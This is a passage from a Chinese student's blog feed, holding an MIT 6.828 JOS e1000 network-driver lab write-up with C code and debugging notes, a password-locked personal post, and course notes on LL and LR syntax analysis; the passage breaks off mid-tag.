class="line"><span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title function_">tdh</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span>*)(e1000+E1000_TDH);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title function_">tdt</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span>*)(e1000+E1000_TDT);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">tds_init</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;NTRANS_DESC;++i)</span><br><span class="line">    {</span><br><span class="line">        tds[i].addr = PADDR(tdbufs[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDBAL) = PADDR(tds);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDBAH) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDLEN) = TDLEN;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDH) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDT) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TCTL) = E1000_TCTL_EN|</span><br><span class="line">                                    E1000_TCTL_PSP|</span><br><span class="line">                                (E1000_TCTL_COLD&amp;(<span class="number">0x40</span>&lt;&lt;E1000_TCTL_COLD_SHIFT));</span><br><span class="line">                                </span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TIPG) = <span class="number">10</span> | (<span class="number">8</span> &lt;&lt; <span class="number">10</span>) | (<span class="number">12</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">tx_pkt</span><span class="params">(<span class="type">char</span>* buf,<span class="type">size_t</span> nbytes)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(nbytes&gt;DESC_BUF_SZ)</span><br><span class="line">        panic(<span class="string">"tx_pkt: invalid packet size\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>((tds[tdt()].cmd&amp;E1000_TXD_CMD_RS))</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(!(tds[tdt()].status&amp;E1000_TXD_STAT_DD))</span><br><span class="line">        {</span><br><span class="line">            cprintf(<span class="string">"tx_pkt: the transmit queue is full,please retry\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> -E_TDQ_FULL;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">memcpy</span>(tdbufs[tdt()],buf,nbytes);</span><br><span class="line">    tds[tdt()].length = (<span class="type">uint16_t</span>)nbytes;</span><br><span class="line">    tds[tdt()].cmd |= (E1000_TXD_CMD_RS|E1000_TXD_CMD_EOP);</span><br><span class="line">    tds[tdt()].status &amp;= (~E1000_TXD_STAT_DD);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_TDT) = (tdt()+<span class="number">1</span>)%NTRANS_DESC;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="Part-B-Receiving-packets-and-the-web-server"><a href="#Part-B-Receiving-packets-and-the-web-server" class="headerlink" title="Part B: Receiving packets and the web server"></a>Part B: Receiving packets and the web server</h3><p>和Transmit packets类似,查手册写就行了.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">rx_init</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;NRECV_DESC;++i)</span><br><span class="line">    {</span><br><span class="line">        rds[i].addr = PADDR(rdbufs[i]);</span><br><span class="line">        rds[i].status &amp;= ~E1000_RXD_STAT_DD;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RAL) = MAC_IPL;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RAH) = MAC_IPH|E1000_RAH_AV;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">128</span>;++i)</span><br><span class="line">        ((<span class="type">uint32_t</span>*)(e1000+E1000_MTA))[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDBAL) = PADDR(rds);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDBAH) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDLEN) = NRECV_DESC*DESC_BUF_SZ;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDH) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDT) = NRECV_DESC<span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RCTL) = (E1000_RCTL_EN | E1000_RCTL_SECRC | E1000_RCTL_BAM | <span class="number">0</span>&lt;&lt;RCTL_BSIZE_SHIFT) &amp; (~E1000_RCTL_LPE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">rx_pkt</span><span class="params">(<span class="type">char</span>* buf,<span class="type">size_t</span> max_bytes)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint32_t</span> next = (rdt()+<span class="number">1</span>)%NRECV_DESC;</span><br><span class="line">    <span class="keyword">if</span>((rds[next].status&amp;E1000_RXD_STAT_DD)==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -E_RDQ_EMPTY;</span><br><span class="line">    <span class="type">uint16_t</span> lenth = rds[next].length;</span><br><span class="line">    <span class="keyword">if</span>(lenth&gt;max_bytes)</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,rdbufs[next],lenth);</span><br><span class="line">    rds[next].status &amp;= (~E1000_RXD_STAT_DD);</span><br><span class="line">    *(<span class="type">uint32_t</span>*)(e1000+E1000_RDT) = next;</span><br><span class="line">    <span class="keyword">return</span> lenth;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>其他代码详见github.<br>通过所有测试.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311141920905.png"></p><p>现在启动httpd server,在浏览器中访问html页面(正好桌面上有这个html及css等文件,就拿来实验了,这是我曾经的一次作业,你可以通过这个页面猜到,我最终没有通过考试),可以看到这样的界面.<br>你可以看到有张只有一小半的BUPT校徽,<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311141954122.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311141744741.png"></p><p>我尝试输出字节数的方式来探究其只有一小半的原因.发现确实未发送完全.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311141751103.png"></p><p>我启动e1000的调试功能,多次实验发现在第125次发送时稳定触发,与TX描述符个数无关,更奇怪的时,触发之后125,126,127还能够继续传输,并且再次触发.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311142017469.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311142036889.png"></p><p>我在课程提供的qemu的源码中找到了这一报错,它意味着e1000正在发送的描述符的buffer_addr为空,但我找不出原因,我的初始化工作和其他工作看起来没有问题,至少不太可能出现buffer_addr为空的问题.我不确定是否是课程提供的qemu存在的问题,该问题会在以后的开发中再来解决,毕竟计算机网络方面的知识我还所知甚少,近期的开发会先从JOS一些实现的优化开始.</p><p>如果您知道问题出在哪里,请联系我,感激不尽.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (desc.buffer_addr) {</span><br><span class="line">    <span class="keyword">if</span> (desc_offset &lt; size) {</span><br><span class="line">        <span class="type">size_t</span> iov_copy;</span><br><span class="line">        hwaddr ba = le64_to_cpu(desc.buffer_addr);</span><br><span class="line">        <span class="type">size_t</span> copy_size = size - desc_offset;</span><br><span class="line">        <span class="keyword">if</span> (copy_size &gt; s-&gt;rxbuf_size) {</span><br><span class="line">            copy_size = s-&gt;rxbuf_size;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">do</span> {</span><br><span class="line">            iov_copy = MIN(copy_size, iov-&gt;iov_len - iov_ofs);</span><br><span class="line">            pci_dma_write(d, ba, iov-&gt;iov_base + iov_ofs, iov_copy);</span><br><span class="line">            copy_size -= iov_copy;</span><br><span class="line">            ba += iov_copy;</span><br><span class="line">            iov_ofs += iov_copy;</span><br><span class="line">            <span class="keyword">if</span> (iov_ofs == iov-&gt;iov_len) {</span><br><span class="line">                iov++;</span><br><span class="line">                iov_ofs = <span class="number">0</span>;</span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">while</span> (copy_size);</span><br><span class="line">    }</span><br><span class="line">    desc_offset += desc_size;</span><br><span class="line">    desc.length = cpu_to_le16(desc_size);</span><br><span class="line">    <span class="keyword">if</span> (desc_offset &gt;= total_size) {</span><br><span class="line">        desc.status |= E1000_RXD_STAT_EOP | E1000_RXD_STAT_IXSM;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">/* Guest zeroing out status is not a hardware requirement.</span></span><br><span class="line"><span class="comment">           Clear EOP in case guest didn't do it. */</span></span><br><span class="line">        desc.status &amp;= ~E1000_RXD_STAT_EOP;</span><br><span class="line">    }</span><br><span class="line">} <span class="keyword">else</span> { <span class="comment">// as per intel docs; skip descriptors with null buf addr</span></span><br><span class="line">    DBGOUT(RX, <span class="string">"Null RX descriptor!!\n"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如果有一天</title>
      <link href="/2023/Life/"/>
      <url>/2023/Life/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c2fd05c331e6143c540661a66868460499c16e11e47dd9a7d288d1c87321ba18"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">特定的人,特定的时间</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>语法分析</title>
      <link href="/2023/Syntax-Analysis/"/>
      <url>/2023/Syntax-Analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h2><p>语法分析器接收词法分析器提供的记号串,检查它们是否能由源程序语言的文法产生.</p><p>语法分析器的输出是对词法分析器产生的记号流的分析树的某种表示.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201353760.png"></p><span id="more"></span><h2 id="上下文无关文法"><a href="#上下文无关文法" class="headerlink" title="上下文无关文法"></a>上下文无关文法</h2><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201357869.png"></p><p>对于文法G产生的语言L(G),当且仅当文法G的开始符号S经过一步或多步推导得到终结符串w时,我们说终结符串w是G的句子.如果两个文法产生同样的语言,则称这两个文法等价.</p><h2 id="分析树和推导"><a href="#分析树和推导" class="headerlink" title="分析树和推导"></a>分析树和推导</h2><p>推导的每一步有两个选择:1)选择被替换的非终结符 2)选择用于替换该终结符的产生式.若每一步都替代最左非终结符的推导,这样的推导叫做最左推导.由最左推导得到的文法符号的串,称为该文法的左句型.</p><p>分析树可以看作推导的图形表示,但其不能显示出替代顺序的选择.比如图中两个E-&gt;id的替代顺序.所以每个分析树都有唯一的最左和最右推导.然而每一个句子不一定只有一个分析树.存在这样句子的文法G称为二义性文法.语法分析器在处理具有二义性的文法时,需要有消除二义性的规则,从而保留唯一一棵分析树.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201408736.png"></p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>实现部分阅读建议: 从文法识别开始阅读,当识别过程中提到文法的某种设计要求或特征时,阅读文法设计对应细节.</p><h2 id="文法设计"><a href="#文法设计" class="headerlink" title="文法设计"></a>文法设计</h2><h3 id="从NFA到上下文无关文法"><a href="#从NFA到上下文无关文法" class="headerlink" title="从NFA到上下文无关文法"></a>从NFA到上下文无关文法</h3><p>挺好理解的,每个状态转移对应一个产生式.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201426926.png"></p><h3 id="文法处理"><a href="#文法处理" class="headerlink" title="文法处理"></a>文法处理</h3><h4 id="消除左递归"><a href="#消除左递归" class="headerlink" title="消除左递归"></a>消除左递归</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201637505.png"></p><p>直接左递归可以用这种方式来消除.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201639863.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201651495.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201652315.png"></p><p>而对于非直接左递归产生式,如:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201645704.png"><br>进行如下的消除算法.<br>简单说说算法的思想:<br>先将所有的非终结符编号1-n,从A1开始对每一个非终结符Ai,对于Ai-&gt;Aj γ的产生式,用Aj的产生式替换Ai-&gt;Aj γ中的Aj,经过N轮后,对于任意产生式Ai-&gt;Aj γ,一定有j &gt;= i.意味着每次推导产生的非终结符的序号一定不小于原非终结符的序号,类似于单调的概念.故无法从一个非终结符推导出它的”祖先”非终结符.</p><p>也就消除(其实是转化)了非直接左递归.之前的消除直接左递归的算法就可以使用了.当然这是从宏观上看的该算法,实际上在算法中每次外循环后都已经消除Ai的非直接左递归,并完成了消除直接左递归的操作.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201644085.png"></p><h4 id="提取左因子"><a href="#提取左因子" class="headerlink" title="提取左因子"></a>提取左因子</h4><p>当不清楚应该用两个选择中的哪个来替换非终结符A时,可改写A产生式来推迟这种决定,直到看见足够多的输入能做出正确选择为止.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201728574.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201728434.png"></p><h3 id="LL-1-文法"><a href="#LL-1-文法" class="headerlink" title="LL(1)文法"></a>LL(1)文法</h3><blockquote><p>Predictive parsers, that is, recursive-descent parsers needing no backtracking,can be constructed for a class of grammars called LL(1). The first “L” in LL(1) stands for scanning the input from left to right, the second “L” for producing a leftmost derivation, and the “1” for using one input symbol of lookahead at each step to make parsing action decisions.</p></blockquote><h2 id="文法识别"><a href="#文法识别" class="headerlink" title="文法识别"></a>文法识别</h2><h3 id="自顶向下语法分析"><a href="#自顶向下语法分析" class="headerlink" title="自顶向下语法分析"></a>自顶向下语法分析</h3><p>自顶向下语法分析的目的是为输入字符串寻找最左推导,或者说,从根节点开始,自上而下,从左到右地为输入字符串建立一棵分析树.</p><h4 id="递归下降语法分析"><a href="#递归下降语法分析" class="headerlink" title="递归下降语法分析"></a>递归下降语法分析</h4><p>递归下降语法分析是自顶向下分析的一般形式,它可能需要回溯,也就是重复地扫描某段输入.</p><p>典型的递归下降语法分析算法:<br>为每个非终结符创建一个函数(procedure).当语法分析器开始分析非终结符A,非终结符A的对应的函数被调用.其选择一个非终结符的推导,若产生式的记号为终结符,右移输入指针表示成功匹配,若为非终结符Xi,调用Xi的函数.该算法用函数调用的栈隐式地记录了非终结符的处理顺序.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201443552.png"></p><p>该算法有两个点需要注意,这两个点也就是导致该算法需要回溯的原因.</p><ol><li>非终结符A可能有多个产生式,如何选择?递归下降语法分析的策略是遍历每一个产生式.</li><li>若选择的产生式不能匹配输入,触发一个non-ultimate failure,该错误使得输入回退到line1,也就是选择产生式的时.这意味着该算法需要在每次遍历选择时保存输入指针的位置.继续遍历,选择一个新的产生式.直到遍历完A的所有产生式,报告一个错误(该句子不是文法的语言).</li></ol><p>该算法有一个问题,对于含有A-&gt;Aa这样产生式的左递归文法,分析器在处理A时,不断的调用A的处理例程,但输入指针并没有前移,形成死循环.详见文法设计部分<code>消除左递归</code></p><h5 id="预测语法分析器"><a href="#预测语法分析器" class="headerlink" title="预测语法分析器"></a>预测语法分析器</h5><p>有的文法可以用不带回溯的递归下降语法分析器来构造.不带回溯的递归下降语法分析器称为预测语法分析器.</p><p>看这样一个例子.当前输入符号是a,此时正在处理的非终结符A有两个产生式:A-&gt;aB,A-&gt;bB,很明显我们应该选择前者,这便是预测,其实可以类比词法分析选择状态转移的过程.(<del>其实不太懂为什么叫预测,词法分析的时候也没DFA见叫预测有限有穷自动机</del>).</p><p>所以我们应该为输入符号和非终结符产生式创建一个关联,称作分析表(当然也有其他的结构).类比于词法分析中将NFA转换成DFA进行模拟,我们应该对文法<code>提取左因子</code>来保证不存在同一非终结符对于输入符号a的多种产生式.</p><h6 id="预测分析表的构造"><a href="#预测分析表的构造" class="headerlink" title="预测分析表的构造"></a>预测分析表的构造</h6><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201813871.png"><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201813745.png"></p><h6 id="表驱动的预测分析算法"><a href="#表驱动的预测分析算法" class="headerlink" title="表驱动的预测分析算法"></a>表驱动的预测分析算法</h6><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201815234.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310201815613.png"></p><h3 id="自底向上语法分析"><a href="#自底向上语法分析" class="headerlink" title="自底向上语法分析"></a>自底向上语法分析</h3><p>自根节点向下建立分析树.<br><del>大量概念名词预警</del></p><p>归约: 一个匹配某产生式右部的字符串w被产生式左部替代的过程,推导的逆过程.<br>自底向上语法分析就是将一个句子一步步归约到文法的开始符号.</p><p>从定义可以看出,自底向上语法分析主要解决两个问题:</p><ol><li>什么时候进行归约</li><li>选择哪个产生式进行归约</li></ol><p>句柄: 一个符号串的句柄是和一个产生式右部匹配的字串,且对该字串的归约过程是最右推导逆过程的一步.</p><h4 id="移进归约分析法"><a href="#移进归约分析法" class="headerlink" title="移进归约分析法"></a>移进归约分析法</h4><p>移进归约分析法用栈来保存文法符号,用输入缓冲区来保存要分析的串w,用$来标记栈底和输入串的右端.初始时栈为空.</p><p>语法分析其将零个或多个输入符号压入栈,直到句柄B在栈顶出现为止,然后选择合适的产生式将句柄B归约,重复此过程直到发现错误或栈中只有开始符号且输入为空.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271156763.png"></p><p>选用栈来进行移进归约分析基于这样一个事实: 句柄总是出现在栈顶而不是栈中.<br>其实就是非终结符总是出现在上一个右句型的左部.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271159720.png"></p><p>但对于一些上下文无关文法,根据栈中的内容和下一个输入符号不能决定是移进还是归约,或不能决定按哪一个产生式进行归约,如二义性文法.这类文法不属于<code>LR(k)</code>类文法.</p><h5 id="算符优先语法分析"><a href="#算符优先语法分析" class="headerlink" title="算符优先语法分析"></a>算符优先语法分析</h5><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241539917.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241539926.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241540363.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241541942.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241541131.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241541341.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311241542555.png"></p><h5 id="LR语法分析"><a href="#LR语法分析" class="headerlink" title="LR语法分析"></a>LR语法分析</h5><p>为什么选择LR语法分析?简单来说就是,广泛有效性.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271218831.png"></p><p>LR语法分析器通过记录当前状态(state)来决定移进归约的操作,状态是项目(item)的集合,项目指示对某个产生式的识别状态(区分于语法分析器的状态).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271355698.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271355785.png"></p><blockquote><p>One collection of sets of LR(0) items,called the canonical LR(0) collection,provides the basis for constructing a deterministic finite automaton that is used to make parsing decisions.Such an automatonis called an LR(0) automaton.</p></blockquote><h6 id="SLR语法分析"><a href="#SLR语法分析" class="headerlink" title="SLR语法分析"></a>SLR语法分析</h6><p>LR语法分析器依靠自动机来完成移进归约操作的决定,<br>LR(0)规范集,其实就是LR语法分析器状态的集合(项目(item)集合(set)的集合(collection)),是构造该自动机的基础.</p><p>为文法G构造LR(0)规范集,需要增广文法,闭包(closure)函数,转移(goto)函数.</p><p>拓广文法: 加入一个新的开始符号和产生式S’ -&gt; S,使得仅当S归约到S’时到达接受状态.(原开始符号可能有多个产生式,也就有多种归约能到达接受状态)</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271423144.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271430616.png"></p><p>解释一下闭包函数的作用:<br>    对于项目E’ -&gt; ·E,指示了语法分析器此刻期望从输入中得到E(回忆一下,项目指示了对某产生式的识别状态),当然,如果存在产生式E-&gt;T,分析器同样可能期望得到一个T.为了节约存储空间,我们使用closure来计算出分析器在某状态时的项目集合,指示当前状态所有可能期望得到的串.<br>    <img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271431598.png"><br>这里再引入两个概念,核心项目和非核心项目.非核心项目可以通过对核心项目求闭包来重新生成.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271438905.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271453632.png"><br>GOTO(I,X)就是在状态I识别到文法符号X后到达的新状态.<br>看这样一个例子:<br>在状态I识别到符号+,状态I的项目(后文在说状态的项目时默认是求闭包后的结果)中期待得到符号+的项目只有E-&gt;E· +T,识别+后称为E-&gt;E+ · T,则新状态应该是项目E-&gt;E+ · T的闭包.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271512338.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271515732.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271541992.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271541791.png"></p><p>LR(0)语法分析器的识别过程.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271537409.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271535052.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271539985.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271540363.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271540956.png"></p><p>活前缀的有效项目,我的理解,有效项目指示当前栈中活前缀在遇到下一个文法符号β时的动作,若β为ε,则归约,否则移进.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310271620179.png"></p><h6 id="规范LR-1"><a href="#规范LR-1" class="headerlink" title="规范LR(1)"></a>规范LR(1)</h6><p>SLR语法分析依靠活前缀的有效项目进行归约或移进操作的指示,然而对于一些文法,可能有一个活前缀的多个有效项目指示分析器做不同的操作,产生移进-归约冲突.看下面这样一个例子:</p><p>对于如下文法:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311707582.png"><br>构造其LR(0)标准集,其中一个状态是这样的.该状态对于活前缀L且即将识别符号=时,有两个有效的项目分别指示移进和归约.语法分析器不能决定.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311707718.png"><br>然而该冲突其实并不存在,因为文法中不存在以R=开始的右句型(=不在FOLLOW(R)中),所以应该选择移进操作.由此可见,如果让状态蕴含更多的信息,可以解决这样的冲突.</p><p>回顾一下在自顶向下分析中,我们解决推导冲突的办法: 提取左因子,合并状态,也可以说成减少状态蕴藏的信息,得到唯一的状态转换.<br>在这里正好逆一下,分裂状态,使状态蕴含更多的信息,得到唯一的状态转换.</p><blockquote><p>同样是消除冲突,为什么会有相反的两种思想?</p><blockquote><p>本质上是相同的,减少目标状态信息,增加当前状态信息.解决推导冲突所需要的信息,在多个输入符号之后,所以我们暂时减少目标状态的信息以推迟决定,直到当前状态搜集到足够多能做出决定的信息.而解决(类似示例中的)归约冲突所需要的信息,存在于文法本身,若文法设计本身不存在这样的归约冲突,语法分析器便可根据文法本身解决问题,所以要做的就是从文法中产生这样的信息并保存到状态中.</p></blockquote></blockquote><p>规范LR(1)语法分析的项目:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311744785.png"></p><p>还记得我们说SLR语法分析依靠活前缀的有效项目进行归约或移进操作的指示吗?规范LR(1)可以理解为提高了有效项目的要求.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311745101.png"></p><p>规范LR(1)项目集的构造<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311749511.png"></p><p>规范LR(1)分析表的构造<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311752329.png"></p><h6 id="LALR"><a href="#LALR" class="headerlink" title="LALR"></a>LALR</h6><p>为了减少规范LR语法分析表的大小,使用一种LALR的分析方法.</p><p>来看这样一个文法和对应的规范LR的GOTO图.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310311805400.png"></p><p>状态I4和I7都只有一个项目<br>对于状态I4,当下个文法符号是c或d时,根据项目的第一分量(产生式)进行归约,对于状态I7,当下个文法符号是$时同样根据项目第一分量进行归约,而这两个第一分量(core)相同.所以我们可以合并这两个状态,而不破坏原本对分析器的指示.<br>(这样的合并可能会延后错误的发现,但不会遗漏).<br><img 